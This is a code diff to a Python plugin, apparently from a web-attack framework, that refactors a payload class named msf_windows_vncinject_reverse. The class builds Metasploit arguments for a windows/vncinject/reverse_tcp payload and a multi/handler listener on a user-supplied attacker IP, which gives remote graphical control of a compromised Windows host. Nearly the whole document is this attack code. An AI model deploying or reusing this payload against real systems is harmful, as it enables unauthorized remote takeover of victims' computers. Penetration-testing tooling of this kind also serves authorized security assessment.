@@ -3,22 +3,17 @@ from plugins.attack.payloads.payloads.metasploit import metasploit
 
 class msf_windows_vncinject_reverse(metasploit):
     '''
-    This payload creates a reverse VNC server in windows using the metasploit framework.
+    This payload creates a reverse VNC server in windows using the metasploit
+    framework.
+    
+    Usage: payload msf_windows_vncinject_reverse <your_ip_address>
     '''
-    def run_execute(self, parameters):
+    def run_execute(self, ip_address):
+        msf_args = 'windows/vncinject/reverse_tcp LHOST=%s |'
+        msf_args += ' exploit/multi/handler PAYLOAD=windows/vncinject/reverse_tcp'
+        msf_args += ' LHOST=%s E'
+        msf_args = msf_args % (ip_address, ip_address)
         
-        if len(parameters) != 1:
-            return 'Usage: payload msf_windows_vncinject_reverse <your ip address>'
-        
-        ip_address = parameters[0]
-        
-        parameters = 'windows/vncinject/reverse_tcp LHOST=%s |'
-        parameters += ' exploit/multi/handler PAYLOAD=windows/vncinject/reverse_tcp'
-        parameters += ' LHOST=%s E'
-        parameters = parameters % (ip_address, ip_address)
-        
-        parameters = parameters.split(' ')
-        
-        api_result = self.api_execute(parameters)
+        api_result = self.api_execute(msf_args)
         return api_result
 
